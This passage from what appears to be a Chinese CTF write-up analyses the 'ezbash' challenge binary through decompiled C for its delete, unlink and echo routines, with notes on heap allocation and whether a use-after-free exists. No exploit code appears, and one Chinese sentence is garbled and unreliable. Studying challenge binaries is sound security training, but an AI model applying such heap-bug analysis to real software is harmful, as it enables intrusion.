class=&#34;built_in&#34;&gt;free&lt;/span&gt;(file-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              file-&amp;gt;context = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;              &lt;span class=&#34;comment&#34;&gt;// 没有uaf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_14:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            unlink(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: &amp;#x27;%s&amp;#x27;: Is a directory\n&amp;quot;&lt;/span&gt;, cmd[v3]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        file = file-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_26:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: &amp;#x27;%s&amp;#x27;: No such file or directory\n&amp;quot;&lt;/span&gt;, cmd[v3]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a1-&amp;gt;next_bro )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a1-&amp;gt;next_bro-&amp;gt;prev_bro = a1-&amp;gt;prev_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a1-&amp;gt;prev_bro )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a1-&amp;gt;prev_bro-&amp;gt;next_bro = a1-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cuurr_pos-&amp;gt;firstson = a1-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a1-&amp;gt;next_bro = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a1-&amp;gt;prev_bro = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(a1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只可以堆当前目录的对象进行操作。当删除的目录下有子目录 x，不会破坏 x 的子文件链表结构，这里看似存在 uaf 名单时册灰姑娘徐每次创建 file 都会清空，所以无法利用。checkfile 以及 checkfolder 分别检查对象是文件还是文件夹。-r 不可删除文件。unlink 的操作也没有什么问题，&lt;/p&gt;
&lt;h4 id=&#34;echo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#echo&#34;&gt;#&lt;/a&gt; echo&lt;/h4&gt;
&lt;p&gt;echo 支持两种操作，一个是将内容直接输出，一个是根据倒数第二个参数是否为 “-&amp;gt;” 决定，不是，就直接输出，否则，就会将数据写进指定的 file。强调，一定是倒数第二参数。其他一律认为是内容，字符串不存在空格，是写进 context 的时候额外加入的。另外，echo 不可以将空字符写入。而且也不会在&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;aecho&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v3; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v4; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-3Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-3Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-3Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; chunksize; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; textlen; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-34h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argv_nums; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-30h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *file; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-28h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *filename; &lt;span class=&#34;comment&#34;&gt;// [rsp+30h] [rbp-20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v14; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v14 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( cmd[v6] );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    argv_nums = v6 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( tofile(cmd[v6 - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;lt; argv_nums; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s &amp;quot;&lt;/span&gt;, cmd[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(cmd[argv_nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;                                           &lt;span class=&#34;comment&#34;&gt;// 写入文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      file = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      filename = cmd[argv_nums];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( findfile(&amp;amp;file, filename) != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: %s: No such file\n&amp;quot;&lt;/span&gt;, filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfile(file) )               &lt;span class=&#34;comment&#34;&gt;// 检查是否为文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        textlen = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( file-&amp;gt;context )                    &lt;span class=&#34;comment&#34;&gt;// 已经写过了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          size = get_chunk_size(file-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(file-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, size);       &lt;span class=&#34;comment&#34;&gt;// 清空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( j = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; j &amp;lt; argv_nums - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; ++j )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( file-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            chunksize = get_chunk_size(file-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;                                  &lt;span class=&#34;comment&#34;&gt;// 空的，申请&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            chunksize = &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v3 = file;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v3-&amp;gt;context = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(file-&amp;gt;context, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          textlen += &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cmd[j]) + &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( textlen &amp;gt;= chunksize )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            chunksize += &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( chunksize &amp;gt; get_chunk_size(file-&amp;gt;context) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v4 = file;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v4-&amp;gt;context = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(file-&amp;gt;context, chunksize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v5 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(cmd[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;strncat&lt;/span&gt;(file-&amp;gt;context, cmd[j], v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( j &amp;lt; argv_nums - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            *(file-&amp;gt;context + &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(file-&amp;gt;context)) = &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: %s: Is a directory\n&amp;quot;&lt;/span&gt;, filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;putchar&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Orphan comments:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;stdout&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
